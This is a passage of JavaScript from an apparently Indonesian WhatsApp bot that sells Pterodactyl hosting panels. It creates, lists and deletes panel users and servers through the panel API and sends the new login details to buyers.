let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c10gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "10024"
let cpu = "210"
let disk = "10024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c10gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "10024"
let cpu = "210"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "cunli": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "cunli-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainV2 + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//================================================================================

case "listadmin-v2": {
if (!isCreator) return reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return reply("Tidak ada admin panel")
var teks = "\n *List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await client.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Adp Versi 2`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await client.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Server`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Hapus Panel Server 2`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("Akun admin panel tidak ditemukan!")
await reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case 'deladminall-v2': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .deladminall-v2 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 2
        let f = await fetch(global.domainV2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikeyV2
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return reply('Tidak ada user yang ditemukan di server 2.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n`);
                continue;
            }

            // Menghapus user dari server 2
            let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikeyV2
                }
            });

            if (deleteUser.ok) {
                reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n `);
            } else {
                let errorText = await deleteUser.text();
                reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 2!');
    } catch (error) {
        return reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}
//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Delete Panel Server 2`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return reply("Server panel tidak ditemukan!")
reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case 'delpanelall-v2': {
if (!isCreator) return reply(mess.owner)
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .delpanelall-v2 , 201, 202, 203');
    }

    try {
        // Mendapatkan daftar server dari server 2
        let f = await fetch(global.domainV2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikeyV2,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return reply('Tidak ada server yang ditemukan di server 2.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domainV2 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikeyV2,
                }
            });

            if (deleteServer.ok) {
                reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
    } catch (error) {
        return reply('Terjadi kesalahan di server 2: ' + error.message);
    }
    break;
}

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isSeller) return reply(mess.seller)
if (!text) return reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Succesfully Create Server Panel*\nData akun sudah dikirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Succes Create Akun Panel*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: loli})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator && !isPremium) return reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return reply("Tidak ada admin panel")
var teks = " *List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await client.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Adp`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
break

//================================================================================

case "listpanel": case "listserver": {
if (!isCreator && !isPremium) return reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
